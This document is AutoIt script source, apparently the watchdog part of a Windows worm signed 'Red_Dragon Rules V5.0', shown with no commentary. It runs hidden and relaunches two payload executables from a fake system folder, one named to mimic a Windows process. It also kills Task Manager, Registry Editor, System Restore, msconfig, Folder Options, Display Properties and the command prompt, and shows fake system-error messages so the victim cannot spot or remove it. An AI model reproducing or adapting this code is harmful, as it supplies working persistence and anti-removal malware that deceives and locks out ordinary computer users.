#NoTrayIcon
 $N = "ReadMe.exe"
 $N2 = "ccsrss.exe"
 $PATH = @WINDOWSDIR & "\W32dllcache\" & $N
 $PATH2 = @WINDOWSDIR & "\W32dllcache\" & $N2
 $WIN1 = "Windows Task Manager"
 $WIN2 = "Registry Editor"
 $WIN3 = "System Restore"
 $WIN4 = "Folder Options"
 $WIN5 = "Display Properties"
 $PROCESS = "msconfig.exe"
 $PROCESS2 = "cmd.exe"
 DO
 $LST = PROCESSLIST ( "ccIsass.exe" )
 IF $LST [ 0 ] [ 0 ] >= 2 THEN
 EXIT
 ELSE
 ENDIF
 IF PROCESSEXISTS ( $N ) THEN
 SLEEP ( 1 )
 ELSE
 RUN ( $PATH )
 ENDIF
 IF PROCESSEXISTS ( $N2 ) THEN
 SLEEP ( 1 )
 ELSE
 RUN ( $PATH2 )
 ENDIF
 IF WINEXISTS ( $WIN1 ) THEN
 WINCLOSE ( $WIN1 )
 MSGBOX ( 0 , "System Error" , "You trying to view system processes. Ending any process can cause a system crash. Windows advice you not to view or end processes. Red_Dragon Rules V5.0" , 3 )
 ELSE
 SLEEP ( 1 )
 ENDIF
 IF WINEXISTS ( $WIN2 ) THEN
 WINCLOSE ( $WIN2 )
 MSGBOX ( 0 , "System Error" , "You trying to change system registry values. Editing any value can cause a system crash. Windows advice you not to view or edit registry values. Red_Dragon Rules V5.0" , 3 )
 ELSE
 SLEEP ( 1 )
 ENDIF
 IF WINEXISTS ( $WIN3 ) THEN
 WINCLOSE ( $WIN3 )
 MSGBOX ( 0 , "System Error" , "System Restoring is disabled in your system. Red_Dragon Rules V5.0" , 3 )
 ELSE
 SLEEP ( 1 )
 ENDIF
 IF WINACTIVE ( $WIN4 ) THEN
 WINCLOSE ( $WIN4 )
 MSGBOX ( 0 , "Critcal Error" , "Folder Options is disabled in your system. Red_Dragon Rules V5.0" , 3 )
 ELSE
 SLEEP ( 1 )
 ENDIF
 IF PROCESSEXISTS ( $PROCESS ) THEN
 PROCESSCLOSE ( $PROCESS )
 MSGBOX ( 0 , "System Error" , "System Configuration is disabled by your Administrator. Red_Dragon Rules V5.0" , 3 )
 ELSE
 SLEEP ( 1 )
 ENDIF
 IF PROCESSEXISTS ( $PROCESS2 ) THEN
 PROCESSCLOSE ( $PROCESS2 )
 MSGBOX ( 0 , "System Error" , "Command Prompt is disabled by your Administrator. Red_Dragon Rules V5.0" , 3 )
 ELSE
 SLEEP ( 1 )
 ENDIF
 IF WINEXISTS ( $WIN5 ) THEN
 WINCLOSE ( $WIN5 )
 MSGBOX ( 0 , "System Error" , "Display Properties of this computer is being disabled by the Red_dragon. Red_Dragon Rules V5.0" , 3 )
 ELSE
 SLEEP ( 1 )
 ENDIF
 UNTIL WINACTIVE ( "(-:<>*Red_Dragon*<>:-)" )
